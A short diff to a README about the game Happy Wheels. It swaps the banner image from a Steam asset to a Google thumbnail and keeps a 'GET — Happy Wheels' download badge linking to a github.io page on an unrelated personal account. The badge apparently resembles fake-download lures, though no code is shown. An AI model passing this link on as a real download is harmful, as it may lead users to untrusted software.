@@ -1,6 +1,6 @@
 # Happy Wheels: Physics-Based Platforming and Creative Obstacle Courses
 
-![Happy Wheels Banner](https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/4705510/a8561b95320fbf49e1c9c045f7acbd55f0513038/capsule_616x353.jpg?t=1791030748)
+![Happy Wheels Banner](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRyU7jwjA64sujV5VPnSiO3r4MlD3HeAC3s0OjNzzTwlUtDguCFI8eVg42K&s=10)
 
 [![GET — Happy Wheels](https://img.shields.io/badge/GET%20%E2%80%94%20Happy%20Wheels-0078D6?style=for-the-badge&logoColor=white)](https://irisreedberger739.github.io/.github/Happy-Wheels-2026)
 
